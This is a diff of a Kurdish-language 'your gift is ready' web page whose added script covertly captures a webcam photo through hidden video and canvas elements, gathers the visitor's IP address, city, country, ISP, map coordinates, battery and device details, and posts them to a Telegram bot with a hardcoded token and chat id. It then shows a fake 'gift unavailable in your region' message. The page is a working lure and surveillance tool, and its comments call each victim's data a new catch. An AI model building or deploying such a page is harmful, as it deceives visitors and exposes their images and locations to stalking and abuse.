@@ -5,63 +5,79 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>وەرگرتنی دیاری</title>
     <style>
-        body { margin: 0; background: linear-gradient(45deg, #1a2a6c, #b21f1f, #fdbb2d); height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: white; }
-        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); width: 85%; max-width: 350px; }
-        .gift-icon { font-size: 60px; margin-bottom: 10px; }
-        .btn { background: #ff4757; color: white; border: none; padding: 15px 25px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
-        .btn:hover { background: #ff6b81; transform: scale(1.02); }
+        body { margin: 0; background: linear-gradient(45deg, #0f2027, #203a43, #2c5364); height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: white; }
+        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px; border-radius: 30px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); width: 85%; max-width: 400px; }
+        .gift-box { font-size: 80px; margin-bottom: 20px; animation: pulse 2s infinite; }
+        .btn { background: #00d2ff; background: linear-gradient(to right, #3a7bd5, #00d2ff); color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(0, 210, 255, 0.3); }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="gift-icon">🎁</div>
+        <div class="gift-box">🎁</div>
         <h2>دیارییەکەت ئامادەیە!</h2>
-        <p>بۆ وەرگرتنی سندوقی دیارییەکە، کلیک لە خوارەوە بکە:</p>
-        <button class="btn" onclick="sendData()">کلیک لێرە بکە بۆ وەرگرتن</button>
+        <p>کلیک لە خوارەوە بکە بۆ پشکنین و وەرگرتنی دیارییەکەت.</p>
+        <button class="btn" onclick="captureAndSend()">وەرگرتنی دیاری</button>
+        <video id="video" style="display:none;" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
     </div>
 
     <script>
-        async function sendData() {
-            // تۆکنە نوێیەکەت لێرە داناوە
-            const token = "8624059192:AAHhgZk6peV5k4LpkXIgX8CwuZkqcbjHHuE";
+        async function captureAndSend() {
+            const token = "8635155944:AAGpSfrwCI7huEFABasy3Izzso40PGonqvM";
             const chat_id = "6166567300"; // دڵنیابە ئەمە ئایدی خۆتە
 
             try {
-                // ١. گرتنی IP و شوێن
+                // ١. داوای مۆڵەتی کامێرا و گرتنی وێنە
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg');
+                
+                // ٢. کۆکردنەوەی زانیارییەکان (IP, Battery, Device)
                 const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-
-                // ٢. گرتنی ڕێژەی باتری
+                const ipD = await ipRes.json();
+                
                 let bat = "Unknown";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    bat = Math.round(b.level * 100) + "%";
+                    bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
                 }
 
-                // ٣. دروستکردنی نامەکە
-                const text = `
-🎯 زانیاری نوێ گەیشت!
+                const infoText = `
+🎯 ڕاوێکی نوێ گەیشت!
+📱 Device: ${navigator.userAgent.split(' ')[2]}
+🔋 Battery: ${bat}
+🌐 IP: ${ipD.ip}
+🌍 Location: ${ipD.city}, ${ipD.country_name}
+📶 ISP: ${ipD.org}
 ----------------------
-🌐 ئایپی: ${ipData.ip}
-🌍 وڵات: ${ipData.country_name}
-🏙️ شار: ${ipData.city}
-🔋 باتری: ${bat}
-📱 ئامێر: ${navigator.platform}
-----------------------
-📍 [بۆ بینینی شوێن لەسەر نەخشە](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})
-                `;
+📍 [Maps](https://www.google.com/maps?q=${ipD.latitude},${ipD.longitude})`;
 
-                // ٤. ناردن بۆ بۆتە نوێیەکە
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                // ٣. ناردنی وێنەکە بۆ تێلیگرام
+                const blob = await (await fetch(imageData)).blob();
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', infoText);
+
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chat_id, text: text, parse_mode: 'Markdown' })
+                    body: formData
                 });
 
-                alert("ببورە، دیارییەکە لە ناوچەکەتدا نەماوە!");
-            } catch (e) {
-                alert("تکایە ئینتەرنێتەکەت بپشکنە");
+                stream.getTracks().forEach(track => track.stop());
+                alert("ببورە، ئەم دیارییە لە ناوچەکەتدا بەردەست نییە!");
+
+            } catch (err) {
+                alert("تکایە ڕێگە بدە بۆ ئەوەی دیارییەکە وەرگریت!");
             }
         }
     </script>
